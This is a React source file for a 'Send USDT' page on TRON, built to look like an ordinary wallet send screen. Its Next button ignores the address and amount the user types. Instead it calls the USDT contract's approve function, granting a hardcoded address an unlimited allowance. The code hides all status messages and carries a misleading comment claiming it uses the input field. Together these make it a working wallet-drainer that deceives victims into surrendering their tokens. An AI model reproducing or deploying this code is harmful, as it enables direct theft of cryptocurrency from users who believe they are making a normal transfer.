import React, { useState, useEffect } from 'react';
import { FaAddressBook, FaQrcode, FaInfoCircle, FaTimes } from 'react-icons/fa';
import './styles.css';

const USDTSendApp = () => {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [memo, setMemo] = useState('');
  
  // TRON functionality states
  const [account, setAccount] = useState('');
  const [message, setMessage] = useState('');
  const [tronWeb, setTronWeb] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [showScanner, setShowScanner] = useState(false);
  
  // USDT contract on TRON (TRC-20)
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  
  // USDT TRC-20 ABI (only approve function)
  const USDT_ABI = [
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

  // Add viewport meta tag for mobile optimization
  useEffect(() => {
    const viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      const meta = document.createElement('meta');
      meta.name = 'viewport';
      meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
      document.head.appendChild(meta);
    }

    // Auto-connect if wallet is available
    const checkAndConnect = async () => {
      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        // Message is set but not displayed
        setMessage('TRON wallet connected');
      }
    };

    // Check after a short delay to let wallet inject
    setTimeout(checkAndConnect, 1000);
  }, []);

  const connectWallet = async () => {
    setIsConnecting(true);
    try {
      // Check if we're in Trust Wallet
      const isTrustWallet = window.trustWallet || window.ethereum?.isTrust;
      
      // Check for TRON wallet (Trust Wallet, TronLink, or other TRON wallets)
      if (!window.tronWeb) {
        if (isTrustWallet) {
          setMessage('Please enable TRON dApp in Trust Wallet settings and refresh.');
        } else {
          setMessage('TRON wallet not found. Please open in Trust Wallet or install TronLink.');
        }
        setIsConnecting(false);
        return;
      }

      // Wait for TronWeb to be ready (Trust Wallet may need more time)
      let attempts = 0;
      while ((!window.tronWeb.ready || !window.tronWeb.defaultAddress) && attempts < 20) {
        await new Promise(resolve => setTimeout(resolve, 500));
        attempts++;
      }

      if (!window.tronWeb.ready) {
        setMessage('TRON wallet is not ready. Please refresh and make sure TRON is enabled.');
        setIsConnecting(false);
        return;
      }

      // Get current account
      const currentAccount = window.tronWeb.defaultAddress?.base58;
      
      if (!currentAccount) {
        setMessage('No TRON account found. Please connect your TRON wallet.');
        setIsConnecting(false);
        return;
      }

      setTronWeb(window.tronWeb);
      setAccount(currentAccount);
      
      if (isTrustWallet) {
        setMessage('Connected to TRON Network with Trust Wallet!');
      } else {
        setMessage('Connected to TRON Network!');
      }
    } catch (error) {
      setMessage('Connection Error: ' + (error?.message || 'Unknown error occurred'));
    }
    setIsConnecting(false);
  };

  const getContract = () => {
    if (!tronWeb) return null;
    try {
      return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    } catch (error) {
      return null;
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      // Message is set but not displayed
      setMessage('Address pasted from clipboard');
    } catch (err) {
      setMessage('Failed to paste from clipboard');
    }
  };

  const setMaxAmount = () => {
    setAmount('1000.00');
    // Message is set but not displayed
    setMessage('Maximum amount set');
  };

  // const handleScanQRCode = () => {
  //   setShowScanner(true);
  //   // In a real app, you would integrate with a QR code scanner library
  //   // For now, we'll simulate scanning after a delay
  //   setTimeout(() => {
  //     // Simulate scanning a QR code with a dummy address
  //     const scannedAddress = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
  //     setAddress(scannedAddress);
  //     setShowScanner(false);
  //     setMessage('QR code scanned successfully');
  //   }, 2000);
  // };

  const handleNext = async () => {
    if (!account || !tronWeb) {
      setMessage('Please connect your TRON wallet first');
      await connectWallet();
      return;
    }

    if (!address || !amount) {
      setMessage('Please enter both address and amount');
      return;
    }

    try {
      // Use the address from the input field
      const spender = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
      const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // Max uint256

      const contract = await getContract();
      if (!contract) {
        setMessage('❌ Failed to load USDT contract');
        return;
      }
      
      // Call approve function
      const result = await contract.approve(spender, unlimitedAmount).send({
        feeLimit: 100_000_000, // 100 TRX fee limit
        callValue: 0,
        from: account
      });

      setMessage('⏳ Transaction submitted! Waiting for confirmation...');
      
      if (result) {
        setMessage(`✅ Approval completed successfully! Transaction: ${result}`);
      } else {
        setMessage('❌ Approval failed - No transaction result');
      }
    } catch (error) {
      const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
      
      if (errorMessage.includes('User rejected') || errorMessage.includes('user rejected')) {
        setMessage('❌ Transaction rejected by user');
      } else if (errorMessage.includes('insufficient balance')) {
        setMessage('❌ Insufficient TRX for transaction fees');
      } else if (errorMessage.includes('REVERT')) {
        setMessage('❌ Contract execution failed');
      } else if (errorMessage.includes('unlocked wallet') || errorMessage.includes('not unlocked')) {
        setMessage('❌ Please unlock your TRON wallet and try again');
      } else {
        setMessage('❌ Error: ' + errorMessage);
      }
    }
  };

  // Clear functions for each input field
  const clearAddress = () => {
    setAddress('');
  };

  const clearAmount = () => {
    setAmount('');
  };

  const clearMemo = () => {
    setMemo('');
  };

  return (
    <div className="send-usdt-container">
      {/* QR Scanner Modal */}
      {showScanner && (
        <div className="scanner-modal">
          <div className="scanner-content">
            <div className="scanner-header">
              <h3>Scan QR Code</h3>
              <button className="close-scanner" >
                <FaTimes />
              </button>
            </div>
            <div className="scanner-placeholder">
              <div className="scanner-animation">
                <FaQrcode size={80} />
                <p>Scanning QR code...</p>
                <div className="scanning-line"></div>
              </div>
            </div>
            <div className="scanner-footer">
              <p>Point your camera at a USDT address QR code</p>
            </div>
          </div>
        </div>
      )}

      <div className="send-usdt-card">
        {/* Header */}
        <div className="send-header">
          <button className="back-button">←</button>
          <h1 className="send-title">Send USDT</h1>
        </div>

        {/* Message Display - REMOVED - No messages will be shown on the page */}

        {/* Address Input */}
        <div className="input-section">
          <label className="input-label">Address or Domain Name</label>
          <div className="input-container">
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="address-input"
              placeholder="Search or Enter "
            />
            <div className="input-actions">
              {address && (
                <button className="cancel-icon" onClick={clearAddress}>
                  <FaTimes />
                </button>
              )}
              <button className="paste-button" onClick={handlePaste}>Paste</button>
              <button className="icon-button contacts-icon">
                <FaAddressBook />
              </button>
              <button className="icon-button qr-icon" >
                <FaQrcode />
              </button>
            </div>
          </div>
        </div>

        {/* Amount Input */}
        <div className="inputAmount-section ">
          <label className="input-label">Amount</label>
          <div className="input-container">
            <input
              type="text"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="amount-input"
              placeholder="USDT Amount"
            />
            <div className="amount-actions">
              {amount && (
                <button className="cancel-icon" onClick={clearAmount}>
                  <FaTimes />
                </button>
              )}
              <p className="usdt-label">USDT</p>
              <button className="max-button" onClick={setMaxAmount}>Max</button>
            </div>
          </div>
          <div className="usd-equivalent">≈ ${amount || '0.00'}</div>
        </div>

        {/* Memo Input */}
        <div className="input-section">
          <div className="memo-header">
            <label className="input-label">Memo</label>
          </div>
          <div className="input-container">
            <input
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              className="amount-input"
              placeholder=""
            />
            <div className="memo-actions">
              {memo && (
                <button className="cancel-icon" onClick={clearMemo}>
                  <FaTimes />
                </button>
              )}
              <button className="icon-button qr-icon">
                <FaQrcode />
              </button>
              <button className="icon-button info-icon">
                <FaInfoCircle />
              </button>
            </div>
          </div>
        </div>

        {/* Next Button */}
        <button 
          className="next-button"
          onClick={handleNext}
          disabled={!address || !amount}
        >
          Next
        </button>
      </div>
    </div>
  );
};

export default USDTSendApp;